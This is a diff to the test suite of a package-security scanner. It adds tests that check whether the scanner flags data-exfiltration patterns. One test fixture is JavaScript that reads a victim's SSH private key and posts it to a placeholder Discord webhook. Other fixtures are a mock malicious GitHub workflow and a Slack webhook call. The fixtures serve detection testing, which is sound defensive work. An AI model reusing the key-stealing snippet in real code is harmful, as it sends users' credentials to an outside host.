@@ -305,10 +305,11 @@ def test_workflow_ioc_detection(tmp_path, capsys):
     # Create .github/workflows directory with suspicious workflow
     workflows_dir = project_dir / ".github" / "workflows"
     workflows_dir.mkdir(parents=True)
-    (workflows_dir / "shai-hulud-workflow.yml").write_text(
-        "name: Shai-Hulud Malicious Workflow\non: [push]\njobs:\n  steal:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo 'evil'",
-        encoding="utf-8",
+    workflow_content = (
+        "name: Shai-Hulud Malicious Workflow\non: [push]\njobs:\n  steal:\n"
+        "    runs-on: ubuntu-latest\n    steps:\n      - run: echo 'evil'"
     )
+    (workflows_dir / "shai-hulud-workflow.yml").write_text(workflow_content, encoding="utf-8")
 
     # Create clean package.json
     (project_dir / "package.json").write_text(
@@ -502,3 +503,177 @@ def test_pattern_severity_filter(tmp_path, capsys):
     assert len(pattern_findings) > 0
     for finding in pattern_findings:
         assert finding["severity"] in ["high", "critical"]
+
+
+def test_exfiltration_detection_critical(tmp_path, capsys):
+    """Test detection of critical exfiltration patterns (credential access + network call)."""
+    project_dir = tmp_path / "project"
+    project_dir.mkdir()
+
+    # Create package.json
+    (project_dir / "package.json").write_text(
+        json.dumps({"name": "test-package", "version": "1.0.0"}),
+        encoding="utf-8",
+    )
+
+    # Create JavaScript file with critical exfiltration pattern
+    (project_dir / "malicious.js").write_text(
+        """
+        const fs = require('fs');
+        const https = require('https');
+
+        // Read SSH keys
+        const sshKey = fs.readFileSync('/Users/victim/.ssh/id_rsa', 'utf8');
+
+        // Send to Discord webhook
+        https.request('https://discord.com/api/webhooks/123/abc', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' }
+        }, (res) => {
+            console.log('Data sent');
+        }).end(JSON.stringify({ content: sshKey }));
+        """,
+        encoding="utf-8",
+    )
+
+    advisory = tmp_path / "advisory.json"
+    advisory.write_text(
+        json.dumps({"items": [{"package": "nonexistent", "version": "1.0.0"}]}),
+        encoding="utf-8",
+    )
+
+    log_dir = tmp_path / "logs"
+
+    exit_code = scan.run(
+        [
+            str(project_dir),
+            "--advisory-file",
+            str(advisory),
+            "--log-dir",
+            str(log_dir),
+            "--format",
+            "structured",
+            "--no-color",
+            "--no-emoji",
+            "--detect-exfiltration",
+        ]
+    )
+
+    assert exit_code == 1
+    captured = capsys.readouterr()
+
+    # Check for exfiltration detection
+    assert "Data Exfiltration Risks" in captured.out or "exfiltration" in captured.out.lower()
+    assert "critical" in captured.out.lower()
+
+
+def test_exfiltration_detection_webhook(tmp_path, capsys):
+    """Test detection of webhook endpoints (high severity)."""
+    project_dir = tmp_path / "project"
+    project_dir.mkdir()
+
+    # Create package.json
+    (project_dir / "package.json").write_text(
+        json.dumps({"name": "test-package", "version": "1.0.0"}),
+        encoding="utf-8",
+    )
+
+    # Create JavaScript file with webhook endpoint
+    (project_dir / "webhook.js").write_text(
+        """
+        fetch('https://hooks.slack.com/services/T00000000/B00000000/XXXXXXXXXXXXXXXXXXXX', {
+            method: 'POST',
+            body: JSON.stringify({ text: 'Hello from script' })
+        });
+        """,
+        encoding="utf-8",
+    )
+
+    advisory = tmp_path / "advisory.json"
+    advisory.write_text(
+        json.dumps({"items": [{"package": "nonexistent", "version": "1.0.0"}]}),
+        encoding="utf-8",
+    )
+
+    log_dir = tmp_path / "logs"
+
+    exit_code = scan.run(
+        [
+            str(project_dir),
+            "--advisory-file",
+            str(advisory),
+            "--log-dir",
+            str(log_dir),
+            "--format",
+            "json",
+            "--detect-exfiltration",
+        ]
+    )
+
+    assert exit_code == 1
+    captured = capsys.readouterr()
+
+    # Parse JSON output
+    findings = json.loads(captured.out)
+    exfil_findings = [f for f in findings if f.get("category") == "exfiltration"]
+
+    # Should detect webhook
+    assert len(exfil_findings) > 0
+    assert any("webhook" in f.get("evidence", "").lower() for f in exfil_findings)
+    assert any(f.get("severity") == "high" for f in exfil_findings)
+
+
+def test_exfiltration_allowlist(tmp_path, capsys):
+    """Test that allowlist filters out false positives."""
+    project_dir = tmp_path / "project"
+    project_dir.mkdir()
+
+    # Create package.json
+    (project_dir / "package.json").write_text(
+        json.dumps({"name": "test-package", "version": "1.0.0"}),
+        encoding="utf-8",
+    )
+
+    # Create JavaScript file with ngrok (commonly used legitimately in dev)
+    (project_dir / "dev-server.js").write_text(
+        """
+        const ngrok = require('ngrok');
+        (async function() {
+            const url = await ngrok.connect(8080);
+            console.log('Tunnel URL:', url);
+        })();
+        """,
+        encoding="utf-8",
+    )
+
+    advisory = tmp_path / "advisory.json"
+    advisory.write_text(
+        json.dumps({"items": [{"package": "nonexistent", "version": "1.0.0"}]}),
+        encoding="utf-8",
+    )
+
+    log_dir = tmp_path / "logs"
+
+    scan.run(
+        [
+            str(project_dir),
+            "--advisory-file",
+            str(advisory),
+            "--log-dir",
+            str(log_dir),
+            "--format",
+            "json",
+            "--detect-exfiltration",
+            "--exfiltration-allowlist",
+            "ngrok.io",
+        ]
+    )
+
+    captured = capsys.readouterr()
+
+    # Parse JSON output
+    findings = json.loads(captured.out)
+    exfil_findings = [f for f in findings if f.get("category") == "exfiltration"]
+
+    # Should not detect ngrok since it's allowlisted
+    assert len(exfil_findings) == 0
